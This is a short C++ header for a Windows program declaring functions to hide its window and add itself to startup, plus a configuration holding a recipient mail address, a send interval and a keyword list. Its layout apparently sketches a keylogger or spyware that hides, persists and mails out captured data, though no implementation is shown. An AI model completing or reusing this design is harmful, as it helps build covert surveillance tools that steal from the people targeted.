#pragma once

#include <Windows.h>

#include <string>
#include <vector>

namespace utility
{
	void hide_window();

	void add_application_to_startup();

	std::string get_application_path();

	bool file_exists(const std::string &file_name);
};

namespace configuration
{
	const std::string configuration_file_name = "configuration.txt";
	
	struct configuration_file_content
	{
		std::string mail_to;
		int mail_send_loop;
		std::vector<std::string> keywords;
	};

	configuration_file_content fill_configuration_struct();
};